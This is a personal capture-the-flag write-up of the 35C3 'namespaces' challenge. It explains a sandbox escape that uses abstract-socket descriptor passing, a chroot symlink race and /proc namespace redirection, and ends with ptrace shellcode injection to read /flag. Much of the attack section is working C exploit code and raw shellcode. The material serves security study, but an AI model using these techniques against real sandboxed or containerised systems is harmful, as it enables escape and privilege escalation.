# Namespaces (sandbox, namespaces, chroot)

This writeup if only for myself. I havn't solved the challenge, I've followed the amazing [writeup](https://blog.perfect.blue/namespaces-35c3ctf) which describes the solution way better then I will. This is one of the nicest challenges I've ever seen and so I strongly encourage you to try it yourself!


## Source code.
The binary given is quite large and so I've placed the reverse engineered source code of it in separete file which can be found [here](source.c).


## Quick description.
The application let's us create up to 10 sandboxes (option 1) in which it will run provided binary.

```console
# nc localhost 1337
A new namespace challenge by popular demand!

What would you like to do?
1) Start sandbox
2) Run ELF
3) Exit
> 1
Please send me an init ELF.
elf len? 
```

We can also select to run binary in already existing sandbox (option 2).

## Creating sandboxes.
Sandboxes are created in very simple way. 

First the main process invokes clone with CLONE_NEWPID, CLONE_NEWNS, CLONE_NEWNET, CLONE_NEWUSER, CLONE_NEWCGROUP, CLONE_NEWUTS flags, so that the child will be placed in seperate namespaces.
Then the child chroots to /tmp/chroots/<$sandbox_idx>.
Finally the child changes its uid/gid to unprivileged user and calls execve on a provided binary.

```c
// source.c 

pid_t new_proc() {
    return syscall(SYS_CLONE, 
        CLONE_NEWNS | CLONE_NEWCGROUP | CLONE_NEWUTS | CLONE_NEWIPC | CLONE_NEWUSER | CLONE_NEWPID | CLONE_NEWNET, 
        0, 0, 0);
}

void start_sandbox() {
    [...]

    child_pid = new_proc();
    switch (child_pid) {
        case 0:
            /* Child job. */
            puts("Please send me an init ELF.");
            fd = load_elf();

            memset(path, 0x0, PAGE_SIZE);
            snprintf(path, PAGE_SIZE, "/tmp/chroots/%ld", sandbox_uid);
            mk_chroot_dir(path);

            chroot(path);
            chdir("/");

            setresgid(1, 1, 1);
            setresuid(1, 1, 1);

            /* Just run an init file. */
            execveat(fd, "", "init", NULL, AT_EMPTY_PATH);
            exit(1);
        default:
            [...]
    }
}
```

## Joining sandboxes.
When process join existing sandbox it iterates over /proc/<$sandboxed process pid>/ns/* files, opens them one by one and uses setns to join namespaces.

```c
char *namespaces[] = {"user", "mnt", "pid", "uts", "ipc", "cgroup"};
void change_ns(pid_t sandbox, unsigned int sandbox_idx) {
    char path[PAGE_SIZE];
    int fd;
    printf("[*] enterning namespaces of pid %d\n", sandbox);

    for (int i = 0; i < namespaces / sizeof(char*); i++) {
        sprintf(path, "/proc/%d/ns/%s", sandbox, namespaces[i]);
        fd = open(path, O_RDONLY);
        setns(fd, 0);
    }

    sprintf(path, "/tmp/chroots/%d", sandbox_idx);
    chroot(path);
    chdir("/");

    setresuid(1, 1, 1);
    setresgid(1, 1, 1);
}
```

## Accessing files outside of sandbox.
First we will see how process inside one sandbox can access any files outside of it's root folder being /tmp/chroots/<$sandbox_id>. Why is that possible? Well, because there is a subtle bug in a way a process joins a sandbox. It forgets to join "net" namescape.

So we have two sandboxes. One with root at /tmp/chroots/0 and the other with root at /tmp/chroots/1. And now the question is how a process inside /tmp/chroots/1 can access files which are in /tmp/chroots/0 if both processes share one net_namespace.

If two processes share same net_namespace, they could communicate using socket. Most sockets are associated with a real file lying in file system. These are useless in our situation as the sandboxed processes don't share filesystem. Luckly there are also abstract unix sockets:

```man
# man page
Traditionally, UNIX domain sockets can be either unnamed, or bound to a filesystem
pathname (marked as being of type socket). Linux also supports an abstract namespace
which is independent of the filesystem.
```

How do they work? Well they are just referenced by socket name, that's all.

```c
// receiver.c

int listen_for_connection() {
    /* Create named socked in abstract namespace, as sandboxes doesn't share file system. */
    int rcv_sk = socket(AF_UNIX, SOCK_STREAM, 0);
    if (rcv_sk == -1) {
        perror("[!] socket failed");
        return -1;
    }

    /* Bind abstract socket. The rcv_addr.sun_path[0] must be null byte to indicate this is an abstract socket. */
    struct sockaddr_un rcv_addr;
    memset(&rcv_addr, 0x0, sizeof(struct sockaddr_un));
    strncpy(&rcv_addr.sun_path[1], RCV_NAME, strlen(RCV_NAME) + 1);
    rcv_addr.sun_family = AF_UNIX;
    if (bind(rcv_sk, (struct sockaddr*) &rcv_addr, sizeof(sa_family_t) + strlen(RCV_NAME) + 1) == -1) {
        perror("[!] bind failed");
        return -1;
    }
}
```

Ok, so our processes can communicate with each other. But it doesn't mean they can access files outside of their root folders yet.
But there is another useful feature UNIX sockets support. It is transfering file descriptors!

```
UNIX domain sockets support passing file descriptors or process
credentials to other processes using ancillary data.
```

For simplicity I will call process inside /tmp/chroots/0 a receiver and process inside /tmp/chroots/1 a sender.
A sender will retrieve a root directory:

```c
int main() {
     /* Send file descriptor to sender's chroot directory: /tmp/chroots/<sender sandbox idx>. */
    int dir_fd = open("/", O_DIRECTORY | O_RDONLY, 0);
}
```

and will send this file descriptor to receiver. Sending file descriptors must be done using ancillary data messages which are a bit complicated. You can find source code of function responsible for sending file descriptor in sender.c (send_fd) and source code of function responsible for receiving it in receiver.c (receive_fd).

So our receiver got a file descriptor to /tmp/chroots/1, how can it now access a files inside this folder? Well almost every function operating on files which requires passing full path has it equivalent which takes a directory file descriptor and relative path. And so: open has equivalent openat, symlink has equivalent symlinkat, readlink has equivalent readlinkat, etc.
Receiver can open a file /tmp/chroots/1/example.txt by invoking:

```c
int example_fd = openat(received_fd, "example.txt", O_RDONLY, 0);
```

## Escaping the chroot.
Now let's move futher. We want a process to fully escape chroot. This is important as chrooted processes cannot create new namespaces and we will need this ability to gain capabilities later on.

This part was really tricky. Root folders /tmp/chroots/<$id> are created with very loose 0777 permissions. So receiver could for example delete /tmp/chroots/1 being root folder of sender and substitute a symlink to / folder. Then when a next process tries to join sender's sandbox and will invoke chroot("/tmp/chroots/1") it will end up calling chroot("/"). 

Moreover we can make an init process escape the chroot too! The init process is more interesting for us as it is an owner of user namespace. But to make init process escape the chroot in the same way as above we must win a race condition. 

Let's say we have a situation where we have two sandboxes with roots in: 
/tmp/chroots/0 (receiver)
/tmp/chroots/1 (sender)
and receiver has already access to file descriptor refering /tmp/chroots/1. 
Now we create a new sandbox. The main process clones and it's child will now first create a folder /tmp/chroots/<$sandbox_uid> and then chroot to it.

```c
// source.c

void mk_chroot_dir(char *path) {
    mkdir(path, 0);
    chmod(path, 777);
}

void start_sandbox() {
    [...]

    child_pid = new_proc();
    switch (child_pid) {
        case 0:
            /* Child job. */
            puts("Please send me an init ELF.");
            fd = load_elf();

            memset(path, 0x0, PAGE_SIZE);
            snprintf(path, PAGE_SIZE, "/tmp/chroots/%ld", sandbox_uid);
            mk_chroot_dir(path);

            // <-- Receiver must substitude /tmp/chroots/<$sandbox_uid> with symlink to /

            chroot(path);
            chdir("/");

            setresgid(1, 1, 1);
            setresuid(1, 1, 1);

            /* Just run an init file. */
            execveat(fd, "", "init", NULL, AT_EMPTY_PATH);
            exit(1);
        default:
            [...]
    }
}
```

So if receiver manages to quickly substitude /tmp/chroots/<$sandbox_uid> with symlink to /, the init process will escape the chroot as chroot("/") has no effect:

```c
// receiver.c 

void substitude_chroot_folder(int fd) {
    /* Wait for the /tmp/chroots/2 folder to be created. */
    while (unlinkat(fd, "../2", AT_REMOVEDIR) == -1) {}
    /* And then remove it. Invoke unlinkat few times to decrease references count. */
    while (!unlinkat(fd, "../2", AT_REMOVEDIR)) {}

    /* Create symlink to / names /tmp/chroots/2, so that chroot(/tmp/chroots/2) has no effect. */
    symlinkat("/", fd, "../2");
}
```

## Escalate?
Now we have an init process which sucessfully escaped chroot. But we must escalate to root. Our init process in an owner of it's pid_namespace and so if it had an CAP_SYS_PTRACE it could trace any process in same pid namespace. How is that usefull? Well, when a new process joins sandbox it first joins the sandboxed process namespaces, then chroots and finally it drops it privileges by invoking setresuid/setresgid. But at the moment when this process joins init process pid namespace, the init process can takeover it with ptrace and thus prevent it from dropping privileges!!!

But there are few problems. First our init process has no CAP_SYS_PTRACE. In order to gain CAP_SYS_PTRACE it has to create a new user namespace.

Again from user_namespace man page:

```
The child process created by clone(2) with the CLONE_NEWUSER flag
starts out with a complete set of capabilities in the new user
namespace. Likewise, a process that creates a new user namespace
using unshare(2) or joins an existing user namespace using setns(2)
gains a full set of capabilities in that namespace.
```

But as we solved this problem we have a new one. Now our process is not an owner of init process pid namespace. 

```
When a nonuser namespace is created, it is owned by the user
namespace in which the creating process was a member at the time of
the creation of the namespace.  Privileged operations on resources
governed by the nonuser namespace require that the process has the
necessary capabilities in the user namespace that owns the nonuser
amespace.
```

Again we can solve this problem by also adding CLONE_NEWPID namespace flag to clone, so that our new user namespace in which we have all capabilities can govern the resources of pid namespace.

```c
// init.c

int gain_sys_ptrace_cap()
{
    /* Create new user namespace to gain capabilities. Create new pid namespace. It will be governed by the new user 
    namespace and thus init process is able to SYS_PTRACE processes within it. */
    if (unshare(CLONE_NEWUSER | CLONE_NEWNS | CLONE_NEWPID | CLONE_NEWUTS | CLONE_NEWIPC | CLONE_NEWCGROUP) == -1)
    {
        perror_wrapper("[!] unshare failed");
        return -1;
    }

    return 0;
}

int main()
{
    char path[PATH_MAX];
    printf("[i] pid: %d\n", getpid());

    if (gain_sys_ptrace_cap() == -1)
    {
        return -1;
    }

    switch (child_pid = fork())
    {
        case 0:
            /* Child process with ability to ptrace processes. */
            [...]

        case 1:
            /* Parent. */
            [...]
```

But again, by solving one, we reach another problem. Now the process which is joining sandbox will join the parent (init) process pid namespace, not the cloned child.

And this is the most tricky part of the whole solution. Again respect for anyone who camed up with solution without hints.
The process which joins the namespaces of sandboxed process does it in not most elegant way. Let me reming you how the pseudocode for it looks like:

```c
// source.c 

char *namespaces[] = {"user", "mnt", "pid", "uts", "ipc", "cgroup"};
void change_ns(pid_t sandbox, unsigned int sandbox_idx) {
    char path[PAGE_SIZE];
    int fd;
    printf("[*] enterning namespaces of pid %d\n", sandbox);

    for (int i = 0; i < namespaces / sizeof(char*); i++) {
        sprintf(path, "/proc/%d/ns/%s", sandbox, namespaces[i]);
        fd = open(path, O_RDONLY);
        setns(fd, 0);
    }
    [...]
}
```

So why is this not the most elegant way? Well, it just iterate over files in /proc/<$sandboxed_process_id>/ns/* files. And it starts with user, then mount namespace. And at this point, the joining process is in the same mount namespace as the init and it cloned child process. And as cloned child has CAP_SYS_ADMIN capability it can 
can substitude files inside /proc/<$sandboxed_process_id>/ns/* with symlinks from to self /proc/<$sandboxed_process_cloned_child_id>/ns/*.

```c
// init.c – child

// this function is almost one by one copied from orginal writeup
int make_run_elf_join_child_pid_namespace(int parent_pid, int child_pid)
{
    char path[PATH_MAX];
    char path2[PATH_MAX];

    mkdir("/tmp/oldproc", 0777);
    if (mount("/proc", "/tmp/oldproc", NULL, MS_BIND | MS_REC, NULL) == -1)
    {
        perror_wrapper("[!][child] mount failed");
        return -1;
    }

    mkdir("/tmp/newproc", 0777);
    if (mount("/tmp/newproc", "/proc", "proc", MS_BIND | MS_REC, NULL) == -1)
    {
        perror_wrapper("[!][child] mount failed");
        return -1;
    }

    sprintf(path, "/tmp/newproc/%d", parent_pid);
    mkdir(path, 0777);
    sprintf(path, "/tmp/newproc/%d/ns", parent_pid);
    mkdir(path, 0777);

    sprintf(path, "/tmp/newproc/%d/ns/pid", parent_pid);
    sprintf(path2, "/tmp/oldproc/%d/ns/pid", child_pid);
    if (symlink(path2, path) == -1)
    {
        perror_wrapper("[!][child] symlink failed");
        return -1;
    }

    /* Create fifo, so that process blocks when trying to change uts namespace. */
    sprintf(path, "/tmp/newproc/%d/ns/uts", parent_pid);
    if (mkfifo(path, 0777) == -1)
    {
        perror_wrapper("[!][child] mkfifo failed");
        return -1;
    }
}
```

The author of https://blog.perfect.blue/namespaces-35c3ctf camed up with a nice idea of not having to win a race with the process. It made it stop on /proc/<$pid>/ns/uts by making it a fifo.

## Ptrace + shellcode
So we managed to trick joining process into joining a pid namespace of our process with CAP_SYS_PTRACE capability. All we have to do is just takeover the joining process. This can be done easly by attaching to joining process and injecting shellcode into it:

```c

char shellcode[] = "\xeb\x34\x5f\x48\x31\xf6\xb8\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\xba\x20\x00\x00\x00"
                   "\x48\x31\xc0\x0f\x05\x48\x89\xc2\xbf\x01\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00"
                   "\x00\x48\x31\xff\x0f\x05\xe8\xc7\xff\xff\xff\x2f\x66\x6c\x61\x67\x00";


void put_data(char *dst, char *src, size_t len, pid_t tracee)
{
    size_t i, mod;
    union u {
        int i;
        char chars[4];
    } u;

    for (i = 0; i < len; i += 4)
    {
        memcpy(u.chars, src + i, 4);
        if (ptrace(PTRACE_POKEDATA, tracee, dst + i, u.i))
        {
            perror("[!] ptrace failed");
            return;
        }
    }

    mod = i % 4;
    if (mod)
    {
        memcpy(u.chars, src + i + mod - 4, 4);
        if (ptrace(PTRACE_POKEDATA, tracee, dst + i + 4 - mod, u.i))
        {
            perror("[!] ptrace failed");
            return;
        }
    }
}

int takeover_escalator_process(pid_t escalator_pid)
{
    struct user_regs_struct regs;

    /* Wait for escalator process to join pid namespace. No need to win the race as a process will block on opening 
    the pipe. */
    while (ptrace(PTRACE_ATTACH, escalator_pid, NULL, NULL) == -1)
    {
        sleep(1);
    }

    waitpid(escalator_pid, NULL, 0);

    /* Retrieve rip to inject shellcode. */
    ptrace(PTRACE_GETREGS, escalator_pid, NULL, &regs);
    put_data((char*) regs.rip, shellcode, sizeof(shellcode), escalator_pid);
    ptrace(PTRACE_DETACH, escalator_pid, NULL, NULL);
}
```


The shellcode just prints /flag file content.

The python part can be found [here](exp-files/exp.py). </br>
The C part consists of 4 separete programs:
1) [sender](exp-files/sender.c) responsible for sending file descriptor for /tmp/chroots/1 to receiver
2) [receiver](exp-files/receiver.c) receives file descriptor from sender and wins a race with init process by substituting /tmp/chroots/2 with symlink to /
3) [init](exp-files/init.c) forks to gain capabilities, tricks joining process to join new pid namespace in which he has all capabilities and is able to takeover it with ptrace.
4) [blocker](exp-files/blocker.c) just prevents from closing sandbox
